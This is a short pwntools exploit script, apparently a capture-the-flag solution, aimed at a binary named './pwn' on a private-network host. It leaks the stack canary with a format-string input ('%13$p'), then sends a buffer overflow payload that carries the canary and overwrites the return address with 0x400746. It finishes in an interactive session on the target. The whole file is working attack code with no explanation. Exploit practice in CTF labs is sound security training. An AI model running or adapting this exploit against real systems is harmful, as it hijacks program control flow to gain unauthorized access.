from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
p = remote('172.16.12.2',6666) 
#p = process(name)
elf = ELF(name)
if args.G:
    gdb.attach(p)

p.recvuntil("Tell me your name:\n")
p.send("%13$p")
p.recvuntil("Nice to see you:\n")
canary = p.recv(18)
success(b"canary: " + canary)

p.recvuntil("What do you want to tell me:\n")
pay = b"a"*40 + p64(int(canary,16)) + p64(0x400746)
p.sendline(pay)
p.interactive()